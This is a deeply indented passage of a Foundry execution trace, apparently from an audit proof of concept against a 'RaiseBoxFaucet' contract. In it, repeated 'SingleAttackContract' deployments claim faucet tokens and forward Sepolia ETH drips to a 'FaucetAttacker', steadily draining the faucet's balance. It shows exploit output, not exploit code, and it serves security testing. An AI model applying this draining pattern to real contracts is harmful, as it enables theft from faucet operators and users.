    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 655000000000000000 [6.55e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x84291130cF7908967eD6Bd1ba0e1BA4aA33738FA
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 69) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5076462] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5075703] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5039535] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5031877] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 650000000000000000 [6.5e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x8125374b39265C1B3e9f15211cf475E881e09A6f
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 70) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4774493] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4773734] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4737566] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4729908] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 645000000000000000 [6.45e17]
